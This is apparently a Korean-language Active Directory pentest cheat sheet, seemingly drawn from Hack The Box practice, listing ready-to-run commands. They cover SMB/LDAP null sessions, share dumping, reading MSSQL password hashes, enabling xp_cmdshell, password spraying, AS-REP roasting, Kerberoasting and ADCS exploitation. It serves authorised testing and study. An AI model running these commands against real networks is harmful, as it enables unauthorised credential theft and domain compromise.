### REF.
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg


# 1. 초기 접근
## 1.1. SMB
### null session
```
### 🔨 nxc
nxc smb <IP> -u '' -p ''
```
### anonymous session
```
### 🔨 nxc
nxc smb <IP> -u 'asdf' -p ''
```
### 유효한 계정 정보
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>'
```
### 전체 파일 다운로드
```
### 🔨 nxc
nxc smb <IP> -u 'asdf' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

### 🔨 smbclient
smbclient //<IP>/<share> -U 'a'
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

## 1.2. LDAP
### null session
```
### 🔨 ldapsearch
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "<검색구문>" <가져올 필터>

## 예시
ldapsearch -x -H ldap://10.129.6.206:389 -b "dc=overwatch,dc=htb" "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))" "sAMAccountName cn"


### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP_NAME>"
nxc ldap <ip> -u '<USERNAME>' -p '<PASSWORD>' --query "<검색구문>" "<가져올 필터>"

## 예시
nxc ldap 10.129.6.206 -u pentest -p 'p3nt3st2025!&' --groups "Domain Admins"
```
### 유효한 계정 정보
```
### 🔨 ldapsearch
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" -D "<USERNAME_DN>" -w "<PASSWORD>" "<검색구문>" [<가져올 필터>]
```
### 주요 검색 구문
```
## 전체 데이터 수집
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))" [*, ntsecuritydescriptor]
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456))" [*,ntsecuritydescriptor] 

## GPO 정책 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(objectClass=groupPolicyContainer)" [displayname,gPCWQLFilter]

## Domain Admin 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=268435456)(samAccountName=Domain Admins))" [samaccountname]

## Unconstrained Delegation 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" [samaccountname]

## Constrained Delegation 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" [samAccountName,msDS-AllowedToDelegateTo]

## RBCD 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" [samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity]
```
## 1.3. RPC
### null session
```
### 🔨 rpcclient
rpcclient -U "" -N <IP>
```
## 1.4. Winrm
### 원격 접근 권한 있는지 확인
```
### 🔨 nxc
nxc winrm <IP> -u '<USERNAME>' -p '<PASSWORD>'
```
## 1.5. MSSQL
### 유효한 계정 정보
```
### 🔨 impacket
### 기본 port(1433)일 경우 -port 옵션 제외
### DC 계정이 아닌, DB 계정으로 접근 시 뒤에 -windows-auth 옵션 제외
impacket-mssqlclient <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP> -port <PORT> -windows-auth
```
### 주요 쿼리
```
## 서버명 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT @@SERVERNAME;

## 데이터베이스 명 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name FROM sys.databases;

## 테이블 명 조회
SQL (OVERWATCH\sqlsvc dbo@overwatch)> select name from sys.tables;

## 현재 사용자의 권한 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

## 서버 파일 읽기
SQL (OVERWATCH\sqlsvc guest@master)> EXEC master..xp_dirtree 'C:\', 1, 1;
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM OPENROWSET( BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

## 로그인한 사용자 password, hash 읽기
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name, password_hash FROM sys.sql_logins;
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name, password FROM master.sys.syslogins;
```
### xp_cmdshell
```
## Step 1. xp_cmdshell 활성화 여부 확인
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

## Step 2. xp_cmdshell 활성화
SQL (OVERWATCH\sqlsvc guest@master)> EXEC sp_configure 'xp_cmdshell', 1;
```
### LinkedServer
```
## LinkedServer 조회
SQL (OVERWATCH\sqlsvc guest@master)> EXEC sp_linkedservers;
SQL (OVERWATCH\sqlsvc guest@master)> enum_links

## LinkedServer에 쿼리
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT @@version');
SQL (OVERWATCH\sqlsvc guest@master)> EXEC ('SELECT SYSTEM_USER') AT SQL07;
```


# 2. 정보 수집
## 2.1. 사용자 조회
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>' --users-export users.txt

### 🔨 ldapserach
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" -D "<USERNAME_DN>" -w "<PASSWORD>" "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

### 🔨 impacket
impacket-GetADUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -all | cut -d ' ' -f 1 | sort -fuV
```
## 2.2. Bloodhound
### install
```
## 설치
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install

## container 활성화
./bloodhound-cli up

## container 재시작
./bloodhound-cli resetpwd

## bloodhound 업데이트
./bloodhound-cli update
```
### Ingestor
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <IP> --bloodhound --collection All

### 🔨 bloodhound-python
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <IP> -d <DOMAIN> -c all --zip
```
## 2.3. 보안 솔루션 조회
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
```

# 3. 추가 계정 확보
## 3.1. Password Spary
```
### 🔨 nxc
nxc smb <IP주소> -u users.txt -p <PASSWORD> | grep +
```
## 3.2. AS-REP Roasting
유효한 계정 정보가 없어도 가능 (사용자 리스트는 있어야 함)
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --asreproast users.txt

### 🔨 impacket
impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request -usersfile users.txt
```
## 3.3. Kerberoasting
유효한 계정 정보가 있어야 가능
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting kerberoast.hashes

### 🔨 impacket
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
```

# 4. Exploit
## 4.1. ADCS
```
## Step 1. ADCS 환경인지 확인
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' -M adcs

## Step 2. ADCS 취약점 스캔
certipy find -vulnerable -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <IP>

## Step 3. ADCS 취약점 exploit
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
```
